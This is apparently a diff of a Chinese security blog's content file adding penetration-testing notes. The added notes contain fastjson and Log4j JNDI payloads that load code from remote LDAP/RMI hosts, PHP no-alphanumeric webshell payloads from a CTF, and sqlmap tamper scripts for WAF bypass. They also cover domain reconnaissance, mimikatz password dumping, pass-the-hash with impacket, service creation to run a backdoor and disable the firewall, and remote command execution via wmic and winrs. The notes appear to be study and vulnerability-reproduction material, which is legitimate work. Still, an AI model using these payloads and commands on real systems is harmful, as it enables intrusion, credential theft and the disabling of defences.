+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span>,<span class="attr">&quot;AsText&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span>&#125;<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;=1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span>,<span class="attr">&quot;resourceName&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span>,<span class="attr">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span>,<span class="attr">&quot;jndiNames&quot;</span>:<span class="string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span>,<span class="attr">&quot;properties&quot;</span>: &#123;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p><a href="https://www.sec-in.com/article/950">浅谈fastjson waf Bypass思路-SecIN (sec-in.com)</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec/Fastjson: Fastjson姿势技巧集合 (github.com)</a></p>
+<p><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p>
+<p>零组文库</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>fastjson</tag>
       </tags>
   </entry>
   <entry>
@@ -1081,6 +1250,10 @@
 </ol>
 <h4 id="更新到rce1"><a href="#更新到rce1" class="headerlink" title="更新到rce1"></a>更新到rce1</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1%E3%80%82">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1。</a></p>
 <p>但不久就被绕过了，经过测试发现<code>URI</code>中不进行<code>URL</code>编码会报这个错，加个空格即可触发<code>$&#123;jndi:ldap://127.0.0.1:1389/ badClassName&#125;</code>（需要用户开启<code>lookup</code>功能的基础上才可以）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:&#x2F;&#x2F;ip:port&#x2F;exp&#125;</span><br></pre></td></tr></table></figure>
+
+
+
 <h4 id="更新到rce2"><a href="#更新到rce2" class="headerlink" title="更新到rce2"></a>更新到rce2</h4><p><a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a></p>
 <p>貌似又被绕过了</p>
 <hr>
@@ -1327,16 +1500,41 @@
 <li><code>md5([1])===md5([2])==NULL</code></li>
 </ol>
 <h4 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="MD5碰撞"></a>MD5碰撞</h4><h2 id="0x03-命令执行"><a href="#0x03-命令执行" class="headerlink" title="0x03 命令执行"></a>0x03 命令执行</h2><p>命令执行函数</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()</span><br></pre></td></tr></table></figure>
 
 
 
 
 
+<h4 id="绕过数字和字母"><a href="#绕过数字和字母" class="headerlink" title="绕过数字和字母"></a>绕过数字和字母</h4><p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423173117812.png" alt="image-20220423173117812"></p>
+<p>post 请求构造</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$_</span>++;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$_</span>);</span><br><span class="line">	<span class="variable">$__</span>=(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">	<span class="variable">$__</span>.=(<span class="string">&quot;.&quot;</span>^<span class="string">&quot;~&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);        <span class="comment"># p</span></span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;/&quot;</span>^<span class="string">&quot;`&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line">    <span class="variable">$__</span>.=(<span class="string">&quot;&#123;&quot;</span>^<span class="string">&quot;/&quot;</span>);</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _POST</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172539634.png" alt="image-20220423172539634"></p>
+<p>get</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span>(<span class="variable">$_</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    _GET</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172618113.png" alt="image-20220423172618113"></p>
+<p>即：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	var_dump(<span class="string">&quot;#./|&#123;&quot;</span>^<span class="string">&quot;|~`//&quot;</span>); <span class="comment">//_POST</span></span><br><span class="line">	var_dump(<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>);   <span class="comment">//_GET</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/01/28/php%E6%BC%8F%E6%B4%9E/image-20220423172820891.png" alt="image-20220423172820891"></p>
+<p>执行命令</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=print_r(`scandir`(<span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);  -》 <span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);  _当作变量传进去执行getFlag()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">思路一：绕过字符和数字</span><br><span class="line">code&#x3D;$_&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">思路二：绕过字符和数字+下划线（变量_和__）</span><br><span class="line">code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();</span><br><span class="line">1.成功 preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code)</span><br><span class="line">2.成功 preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line">3.失败 preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;+&#x3D;getFlag</span><br><span class="line">- ?code&#x3D;$&#123;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;&#125;[&#39;+&#39;]();&amp;_&#x3D;assert&amp;__&#x3D;print_r(&#96;scandir&#96;(&#39;&#x2F;&#39;))</span><br><span class="line"></span><br><span class="line">思路三：绕过字符和数字+下划线（变量_和__）+美元符号（$）</span><br><span class="line">1.均失败</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line"></span><br><span class="line">【最终答案】</span><br><span class="line">思路四：采用通配符绕过美元符号（$）</span><br><span class="line">?code&#x3D;?&gt;&lt;?&#x3D;&#96;&#x2F;???&#x2F;??? &#x2F;????&#96;?&gt;</span><br><span class="line">?code&#x3D;?%3E%3C?&#x3D;&#96;&#x2F;???&#x2F;???%20&#x2F;????&#96;?%3E</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code) + 长度限制</span><br><span class="line"></span><br><span class="line">数字+字母：通过异或构造GET或POST请求实现绕过</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线：构造payload并通过 $&#123;&#125;[’+’] () 替换下划线</span><br><span class="line"></span><br><span class="line">preg_match(&quot;&#x2F;[A-Za-z0-9_$@]+&#x2F;&quot;,$code)</span><br><span class="line"></span><br><span class="line">数字+字母+下划线+美元符：通过通配符（?）实现替换</span><br></pre></td></tr></table></figure>
 
 
 
 
+
+<p>参考：</p>
+<p>津门杯CTF<a href="https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ">https://mp.weixin.qq.com/s/llllXAv_xt30uUTwc5DGgQ</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></p>
 <h2 id="0x04-文件包含"><a href="#0x04-文件包含" class="headerlink" title="0x04 文件包含"></a>0x04 文件包含</h2><p><a href="https://blog.csdn.net/qq_19980431/article/details/83018232">参考</a></p>
 <hr>
 ]]></content>
@@ -1419,7 +1617,7 @@
     <content><![CDATA[<h2 id="sqlmap的常见使用方式"><a href="#sqlmap的常见使用方式" class="headerlink" title="sqlmap的常见使用方式"></a>sqlmap的常见使用方式</h2><blockquote>
 <p>需要python环境</p>
 </blockquote>
-<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>常见指令:</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>常见指令:</p>
 <ul>
 <li><p><code>-u</code>               指定url</p>
 </li>
@@ -1460,15 +1658,30 @@
 <li><p><code>-v </code>              显示详细的输出等级（-v 3 会显示Payload）</p>
 </li>
 </ul>
-<p>代理：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy http:&#x2F;&#x2F;192.168.1.1:xxxx</span><br></pre></td></tr></table></figure>
+<h3 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy http:&#x2F;&#x2F;192.168.1.1:xxxx</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy-file：加载代理ip列表</span><br><span class="line"></span><br><span class="line">–proxy-file&#x3D;xxx.txt</span><br></pre></td></tr></table></figure>
 
 
 
-<p><code>--fresh-queries</code>             不会从缓存里面加载</p>
+
+
+<h3 id="fresh-queries"><a href="#fresh-queries" class="headerlink" title="--fresh-queries"></a><code>--fresh-queries</code></h3><p>​    不会从缓存里面加载</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;xxxxx&quot; --proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:10809 --is-dba --level 5</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>使用：<code>--tamper=xxxx.py</code></p>
+<p>环境：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function sqlwaf( $str ) &#123;</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;and&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;or&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;union&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;select&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;sleep&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;group&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;extractvalue&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;updatexml&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	$str &#x3D; str_ireplace( &quot;PROCEDURE&quot;, &quot;&quot;, $str );</span><br><span class="line"></span><br><span class="line">	return $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tamper脚本编写：xxxx.py   （关键词替换）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># sqlmap/tamper/escapequotes.py</span></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL              <span class="comment">#__priority__指定了tamper脚本的优先级</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        result = payload.replace(<span class="string">&quot;OR&quot;</span>, <span class="string">&quot;oorr&quot;</span>).replace(<span class="string">&quot;AND&quot;</span>, <span class="string">&quot;aandnd&quot;</span>).replace(<span class="string">&quot;UNION&quot;</span>, <span class="string">&quot;ununionion&quot;</span>).replace(<span class="string">&quot;SELECT&quot;</span>, <span class="string">&quot;seleselectct&quot;</span>).replace(<span class="string">&quot;PROCEDURE&quot;</span>, <span class="string">&quot;PROCEPROCEDUREURE&quot;</span>).replace(<span class="string">&quot;SLEEP&quot;</span>, <span class="string">&quot;slesleepep&quot;</span>).replace(<span class="string">&quot;GROUP&quot;</span>, <span class="string">&quot;grogroupup&quot;</span>).replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>, <span class="string">&quot;extractvextractvaluealue&quot;</span>).replace(<span class="string">&quot;UPDATEXML&quot;</span>, <span class="string">&quot;updatupdatexmlexml&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+
+
+
+<p>固定格式：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> xxx             <span class="comment">#根据需求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.NORMAL </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">	<span class="keyword">if</span> payload:</span><br><span class="line">		xxxxx</span><br><span class="line">		xxxxx</span><br><span class="line">		xxxxx</span><br><span class="line">		result=xxxxx</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1815,7 +2028,7 @@
 
 
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220326143716341.png" alt="image-20220326143716341"></p>
-<h2 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="域的信息收集"><a href="#域的信息收集" class="headerlink" title="域的信息收集"></a>域的信息收集</h2><h4 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user &#x2F;domain           #查询域用户 (通过samr，利用的RPC接口)</span><br><span class="line">net view                   #查看域信息</span><br><span class="line">net view &#x2F;domain           #查看主域信息</span><br><span class="line">net accounts &#x2F;domain       #获取与密码信息(策略)</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain                            #查询域内组</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain         #查看域内所有的主机名</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain       #查看域控</span><br><span class="line">net group &quot;domain admins&quot;   &#x2F;domain          #查看域管理员</span><br><span class="line">net group &quot;enterpriser admins&quot;   &#x2F;domain     #查看企业管理用户</span><br><span class="line">net config workstation      #主机名，主机版本，工作站域，工作站域dns-name,当前登录域</span><br><span class="line"></span><br><span class="line">nslookup god.org            #可以定位域控 </span><br><span class="line">https:&#x2F;&#x2F;www.secpulse.com&#x2F;archives&#x2F;32859.html</span><br><span class="line"></span><br><span class="line">net share                   #查看本地共享资源</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
@@ -1830,10 +2043,15 @@
 
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
-<p>域信任关系</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts   获取域信任信息 </span><br><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:192.168.100.236 返回所有信任192.168.100.236域的所有域</span><br><span class="line">nltest &#x2F;dsgetdc:shmily.god 返回信任域相关信息</span><br></pre></td></tr></table></figure>
+<h4 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts   获取域信任信息 </span><br><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:192.168.100.236 返回所有信任192.168.100.236域的所有域</span><br><span class="line">nltest &#x2F;dsgetdc:shmily.god 返回信任域相关信息</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220414000904861.png" alt="image-20220414000904861"></p>
+<h4 id="域用户所登录的计算机"><a href="#域用户所登录的计算机" class="headerlink" title="域用户所登录的计算机"></a>域用户所登录的计算机</h4><ol>
+<li>powershell方式</li>
+</ol>
+<p><a href="https://www.cnblogs.com/victor0/p/13522618.html">https://www.cnblogs.com/victor0/p/13522618.html</a></p>
+<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>Adfind.exe</p>
+<p>​                                                       </p>
 <p>参考：</p>
 <p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
 <p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
@@ -1862,7 +2080,9 @@
 <p>AAD3B435B51404EEAAD3B435B51404EE是<code>LM hash</code>   这个是之前认证使用的，现在已经不使用了</p>
 <p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
 <p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
-<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
+<p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth。</p>
+ <span id="more"></span>
+
 <p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p>
 <p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure>
@@ -1879,8 +2099,6 @@
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
 <p>可分为两步：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug             提升权限</span><br><span class="line">sekurlsa::logonpasswords     抓密码</span><br></pre></td></tr></table></figure>
-
- <span id="more"></span>
 
 
 
@@ -1997,18 +2215,68 @@
 
 
 
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><ul>
-<li>开放135</li>
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><p>windows 2008 以下 at</p>
+<h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><p>windows 2008 及以上 schtasks</p>
+<h3 id="Atexec"><a href="#Atexec" class="headerlink" title="Atexec"></a>Atexec</h3><ul>
+<li>Impacket套件中的Atexec.py  能通过windows计划任务执行远程命令</li>
 </ul>
-<h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b</span><br><span class="line">shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h3 id="ipc-sc"><a href="#ipc-sc" class="headerlink" title="ipc+sc"></a>ipc+sc</h3><p>sc主要用来对操作系统服务进行管理</p>
+<p>建立ipc后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\ip  create servername binpath&#x3D; &quot;c:\door.exe&quot; start&#x3D;auto</span><br><span class="line"></span><br><span class="line">启动</span><br><span class="line"></span><br><span class="line">sc \ip start servername</span><br></pre></td></tr></table></figure>
+
+<p>​        </p>
+<p>sc通过服务关防火墙 </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\ip create unablefirewall binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line"></span><br><span class="line">sc \\ip start unablefirewall</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>前言：</p>
+<p>WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；用户可以使用 WMI 管理本地和远程计算机。</p>
+<p>平时可以用wmic查看进程/安装程序</p>
 <ul>
-<li>impacket</li>
+<li>开放135，没有开防火墙</li>
 </ul>
-<p>atexec.py  直接hash传递进行命令执行，并提权system  （需要免杀）</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+<p>利用：</p>
+<p>ipc+wmic：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	wmic &#x2F;node:IP &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">	wmic &#x2F;node:192.168.xxx.xxx &#x2F;user:admin &#x2F;password:123456 process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">type \\192.168.xxx.xxx\c$\result.txt</span><br></pre></td></tr></table></figure>
 
 
 
+<p>impacket中的wmiexec.py使用：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	python wmiexec.py 用户名:密码@目标IP                                  #获得交互式shell</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP           #hash传递</span><br><span class="line">   </span><br><span class="line">   python wmiexec.py -hashes LM Hash:NT Hash 域名&#x2F;用户名@目标IP &quot;ipconfig&quot; </span><br></pre></td></tr></table></figure>
+
+
+
+<p>还有vbs，powershell方式</p>
+<h1 id="WinRm服务"><a href="#WinRm服务" class="headerlink" title="WinRm服务"></a>WinRm服务</h1><p>前言：</p>
+<p>Windows 远程管理(WinRM)是 WS-Management 协议的 Microsoft 实现，该协议为使用 Web 服务的本地计算机和远程计算机之间的通信提供了一种安全的方式。</p>
+<p>WinRM 默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。</p>
+<p> WinRM HTTP 通过 TCP 端口 5985 进行通信，启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。</p>
+<p>利用：</p>
+<p>winrs</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrs -r:http:&#x2F;&#x2F;ip:5985 -u:[username] -p:[password] &lt;command&gt;</span><br><span class="line"></span><br><span class="line">winrs -r:http:&#x2F;&#x2F;dc1.god.loal:5985 -u:[username] -p:[password] &lt;command&gt;   #域中指定远程主机机器名</span><br></pre></td></tr></table></figure>
+
+
+
